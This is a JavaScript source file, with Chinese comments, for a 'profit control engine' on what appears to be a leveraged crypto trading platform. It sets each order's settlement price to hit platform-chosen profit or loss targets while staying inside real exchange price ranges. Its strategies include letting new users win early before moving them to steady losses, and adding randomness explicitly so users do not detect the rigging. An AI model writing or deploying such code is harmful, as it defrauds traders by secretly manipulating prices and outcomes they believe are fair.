// 盈亏控制服务 - 线控核心实现
// 注意：不是"胜率控制"，而是通过控制价格线来影响用户盈亏

/**
 * 盈亏控制引擎
 * 
 * 核心概念：
 * - 不控制"赢/输"的次数（胜率）
 * - 控制每次的盈亏金额
 * - 目标：期望值、盈亏比、累计盈亏
 */
class ProfitControlEngine {
  constructor(config = {}) {
    this.config = {
      maxPriceDeviation: 0.001,   // 最大价格偏离 0.1%（保持真实性）
      minPriceDeviation: 0.00001, // 最小价格偏离 0.001%
      defaultTimeWindow: 30,      // 默认时间窗口 30秒
      ...config
    }
    
    this.priceService = new PriceService()
    this.statisticsService = new StatisticsService()
    this.ruleEngine = new RuleEngine()
  }

  /**
   * 处理订单结算
   * @param {Object} order - 订单信息
   * @returns {Object} 结算结果
   */
  async processSettlement(order) {
    try {
      // 1. 获取用户统计数据
      const userStats = await this.statisticsService.getUserStats(order.userId)
      
      // 2. 检查是否应用风控规则
      const matchedRules = await this.ruleEngine.matchRules(order, userStats)
      
      // 3. 获取市场价格范围
      const priceRange = await this.priceService.getMarketPriceRange(
        order.symbol,
        Date.now(),
        this.config.defaultTimeWindow
      )
      
      // 4. 计算目标盈亏金额（核心：不是判断赢/输，而是计算盈亏金额）
      let targetProfit = 0
      let controlApplied = false
      let controlStrategy = null
      
      if (matchedRules.length > 0) {
        const rule = matchedRules[0]
        const profitControl = rule.action.params.profitControl
        
        // 根据不同模式计算目标盈亏
        const result = await this.calculateTargetProfit(
          order,
          userStats,
          profitControl
        )
        
        targetProfit = result.targetProfit
        controlApplied = true
        controlStrategy = result.strategy
      }
      
      // 5. 根据目标盈亏计算结算价格
      const settlementPrice = await this.calculateSettlementPrice(
        order,
        targetProfit,
        priceRange
      )
      
      // 6. 计算实际盈亏
      const actualProfit = this.calculateProfitLoss(order, settlementPrice)
      
      // 7. 返回结算结果
      return {
        success: true,
        orderId: order.orderId,
        marketPriceRange: priceRange,
        settlementPrice,
        targetProfit,
        actualProfit,
        profitDifference: actualProfit - targetProfit,
        controlApplied,
        controlStrategy,
        timestamp: Date.now()
      }
    } catch (error) {
      console.error('Settlement processing error:', error)
      throw error
    }
  }

  /**
   * 计算目标盈亏金额（核心方法）
   * 
   * @returns {Object} { targetProfit, strategy, ... }
   */
  async calculateTargetProfit(order, userStats, profitControl) {
    const { mode } = profitControl
    
    switch (mode) {
      case 'expected_value':
        return await this.expectedValueStrategy(order, userStats, profitControl)
      
      case 'profit_ratio':
        return await this.profitRatioStrategy(order, userStats, profitControl)
      
      case 'cumulative':
        return await this.cumulativeStrategy(order, userStats, profitControl)
      
      case 'staged':
        return await this.stagedStrategy(order, userStats, profitControl)
      
      default:
        return { targetProfit: 0, strategy: 'none' }
    }
  }

  /**
   * 策略1：期望值控制（推荐）
   * 
   * 目标：让用户的期望值为负数
   * 例如：期望值 = -50，表示用户平均每单亏损 $50
   */
  async expectedValueStrategy(order, userStats, control) {
    const { targetExpectedValue = -50 } = control
    
    // 当前平均盈亏
    const currentAvgProfit = userStats.totalProfit / userStats.totalOrders || 0
    
    // 计算这一单需要的盈亏金额
    let targetProfit
    
    if (currentAvgProfit > targetExpectedValue) {
      // 当前平均盈利过高，需要增加亏损
      const gap = currentAvgProfit - targetExpectedValue
      targetProfit = targetExpectedValue - gap * 0.5
    } else if (currentAvgProfit < targetExpectedValue * 1.5) {
      // 亏损过多，给点甜头
      const gap = targetExpectedValue - currentAvgProfit
      targetProfit = targetExpectedValue + gap * 0.3
    } else {
      // 正常范围
      targetProfit = targetExpectedValue
    }
    
    // 添加随机性，避免被发现规律
    targetProfit += (Math.random() - 0.5) * 20
    
    return {
      targetProfit,
      strategy: 'expected_value',
      targetExpectedValue,
      currentAvgProfit
    }
  }

  /**
   * 策略2：盈亏比控制
   * 
   * 控制赢的时候赢多少，输的时候输多少
   */
  async profitRatioStrategy(order, userStats, control) {
    const {
      avgWinAmount = 200,
      avgLossAmount = -150,
      adjustToTarget = true
    } = control
    
    // 当前盈亏比
    const currentAvgWin = userStats.totalWinAmount / userStats.winCount || 0
    const currentAvgLoss = userStats.totalLossAmount /userStats.lossCount || 0
    const currentWinRate = userStats.winCount / userStats.totalOrders || 0
    
    // 判断这一单应该盈利还是亏损
    let targetProfit
    
    // 简单策略：根据历史盈亏调整
    const totalProfit = userStats.totalProfit || 0
    
    // 微随机波动范围 ±2%
    const randomFactor = () => 1 + (Math.random() * 0.04 - 0.02)
    if (totalProfit > 1000) {
      // 用户盈利较多，让他亏
      targetProfit = avgLossAmount * randomFactor()
    } else if (totalProfit < -500) {
      // 用户亏损较多，让他赚
      targetProfit = avgWinAmount * randomFactor()
    } else {
      // 随机，但保持目标盈亏比
      const shouldWin = Math.random() < 0.4
      targetProfit = shouldWin
        ? avgWinAmount * randomFactor()
        : avgLossAmount * randomFactor()
    }
    
    return {
      targetProfit,
      strategy: 'profit_ratio',
      avgWinAmount,
      avgLossAmount,
      currentAvgWin,
      currentAvgLoss,
      currentWinRate
    }
  }

  /**
   * 策略3：累计盈亏控制
   * 
   * 限制用户的累计盈利/亏损
   */
  async cumulativeStrategy(order, userStats, control) {
    const {
      maxProfit = 10000,        // 最大累计盈利
      maxLossRatio = 0.3,       // 最大亏损比例（占入金）
      targetProfit = -50
    } = control
    
    const totalProfit = userStats.totalProfit || 0
    const totalDeposit = userStats.totalDeposit || 10000
    const lossRatio = Math.abs(Math.min(totalProfit, 0)) / totalDeposit
    
    let adjustedTarget = targetProfit
    
    // 检查是否超出限制
    if (totalProfit > maxProfit) {
      // 超过最大盈利，加大亏损力度
      adjustedTarget = Math.min(adjustedTarget, -100)
    } else if (lossRatio > maxLossRatio) {
      // 超过最大亏损比例，必须给盈利
      adjustedTarget = Math.max(adjustedTarget, 50)
    }
    
    return {
      targetProfit: adjustedTarget,
      strategy: 'cumulative',
      totalProfit,
      maxProfit,
      lossRatio,
      maxLossRatio
    }
  }

  /**
   * 策略4：阶段性策略（推荐）
   * 
   * 新用户：让他赚钱（吸引）
   * 老用户：逐步转为小亏（盈利）
   */
  async stagedStrategy(order, userStats, control) {
    const {
      newUserOrders = 20,       // 新用户阶段：前20单
      newUserTarget = 25,       // 新用户每单赚 $25
      transitionOrders = 100,   // 过渡期：20-100单
      matureTarget = -50        // 成熟期：每单亏 $50
    } = control
    
    const totalOrders = userStats.totalOrders || 0
    let targetProfit
    
    if (totalOrders < newUserOrders) {
      // 新用户阶段：让他赚钱
      targetProfit = newUserTarget
    } else if (totalOrders < transitionOrders) {
      // 过渡期：线性过渡
      const progress = (totalOrders - newUserOrders) / (transitionOrders - newUserOrders)
      targetProfit = newUserTarget + (matureTarget - newUserTarget) * progress
    } else {
      // 成熟期：保持小幅亏损
      targetProfit = matureTarget
      
      // 如果用户累计盈利过多，加大力度
      if (userStats.totalProfit > 5000) {
        targetProfit = matureTarget * 2
      }
      
      // 如果用户亏损过多，给点甜头
      if (userStats.totalProfit < -3000) {
        targetProfit = matureTarget * 0.5
      }
    }
    
    return {
      targetProfit,
      strategy: 'staged',
      stage: totalOrders < newUserOrders ? 'new' : 
             totalOrders < transitionOrders ? 'transition' : 'mature',
      totalOrders
    }
  }

  /**
   * 根据目标盈亏计算结算价格
   * 
   * 核心算法：
   * profit = (settlementPrice - openPrice) × quantity × leverage
   * 
   * 反推：
   * settlementPrice = openPrice + profit / (quantity × leverage)
   */
  async calculateSettlementPrice(order, targetProfit, priceRange) {
    const { openPrice, direction, quantity, leverage } = order
    
    // 计算需要的价格变动
    const priceMove = targetProfit / (quantity * leverage)
    
    // 计算理论结算价格
    let theoreticalPrice
    if (direction === 'long') {
      theoreticalPrice = openPrice + priceMove
    } else {
      theoreticalPrice = openPrice - priceMove
    }
    
    // 检查是否在市场价格范围内
    if (theoreticalPrice >= priceRange.min && theoreticalPrice <= priceRange.max) {
      // 在范围内，可以使用
      return theoreticalPrice
    }
    
    // 超出范围，使用边界值
    if (direction === 'long') {
      // 做多：价格越低对平台越有利
      return theoreticalPrice < priceRange.min ? priceRange.min : priceRange.max
    } else {
      // 做空：价格越高对平台越有利
      return theoreticalPrice > priceRange.max ? priceRange.max : priceRange.min
    }
  }

  /**
   * 计算盈亏金额
   */
  calculateProfitLoss(order, settlementPrice) {
    const { openPrice, direction, quantity, leverage } = order
    
    let priceDiff
    if (direction === 'long') {
      priceDiff = settlementPrice - openPrice
    } else {
      priceDiff = openPrice - settlementPrice
    }
    
    return priceDiff * quantity * leverage
  }
}

/**
 * 多交易所价格服务
 */
class PriceService {
  constructor() {
    this.exchanges = ['binance', 'okx', 'huobi', 'kraken']
  }

  /**
   * 获取市场价格范围
   * 
   * @param {string} symbol - 交易对
   * @param {number} timestamp - 时间戳
   * @param {number} windowSeconds - 时间窗口（秒）
   * @returns {Object} { min, max, avg, spread }
   */
  async getMarketPriceRange(symbol, timestamp, windowSeconds = 30) {
    try {
      // 获取多交易所价格
      const prices = await this.getMultiExchangePrices(symbol, timestamp)
      
      // 获取时间窗口内的价格波动
      const historyPrices = await this.getTimeWindowPrices(
        symbol,
        timestamp,
        windowSeconds
      )
      
      // 合并所有价格数据
      const allPrices = [...prices, ...historyPrices]
      
      return {
        min: Math.min(...allPrices),
        max: Math.max(...allPrices),
        avg: allPrices.reduce((a, b) => a + b) / allPrices.length,
        spread: Math.max(...allPrices) - Math.min(...allPrices),
        count: allPrices.length
      }
    } catch (error) {
      console.error('Get price range error:', error)
      // 返回默认范围
      return { min: 50000, max: 50100, avg: 50050, spread: 100, count: 0 }
    }
  }

  /**
   * 获取多交易所价格
   */
  async getMultiExchangePrices(symbol, timestamp) {
    // 模拟：实际应该调用各交易所 API
    return [
      50000 + Math.random() * 50 - 25,  // Binance
      50000 + Math.random() * 50 - 25,  // OKX
      50000 + Math.random() * 50 - 25,  // Huobi
      50000 + Math.random() * 50 - 25   // Kraken
    ]
  }

  /**
   * 获取时间窗口内的价格
   */
  async getTimeWindowPrices(symbol, centerTime, windowSeconds) {
    // 模拟：获取前后30秒内的秒级K线
    const prices = []
    for (let i = -windowSeconds; i <= windowSeconds; i += 5) {
      prices.push(50000 + Math.random() * 100 - 50)
    }
    return prices
  }

  /**
   * 获取实时价格（向后兼容）
   */
  async getRealtimePrice(symbol) {
    const range = await this.getMarketPriceRange(symbol, Date.now(), 10)
    return range.avg
  }
}

/**
 * 用户统计服务
 */
class StatisticsService {
  /**
   * 获取用户统计数据
   */
  async getUserStats(userId) {
    // 模拟：实际应该从数据库查询
    return {
      userId,
      totalOrders: 50,
      totalProfit: 500,
      totalWinAmount: 2500,
      totalLossAmount: -2000,
      winCount: 25,
      lossCount: 25,
      totalDeposit: 10000,
      lastOrderTime: Date.now() - 3600000
    }
  }

  /**
   * 获取最近订单
   */
  async getRecentOrders(userId, count = 20) {
    // 模拟
    return []
  }

  /**
   * 分析用户行为
   */
  async analyzeUserBehavior(userId) {
    // 模拟
    return {
      tradesPerHour: 5,
      avgOrderValue: 1000,
      riskScore: 0.5
    }
  }
}

/**
 * 规则引擎
 */
class RuleEngine {
  /**
   * 匹配规则
   */
  async matchRules(order, userStats) {
    // 模拟：实际应该从规则库查询匹配的规则
    return [
      {
        id: 'rule_001',
        name: '期望值控制',
        action: {
          type: 'profit_control',
          params: {
            profitControl: {
              mode: 'expected_value',
              targetExpectedValue: -50
            }
          }
        }
      }
    ]
  }
}

// 导出
export {
  ProfitControlEngine,
  PriceService,
  StatisticsService,
  RuleEngine
}

export default ProfitControlEngine
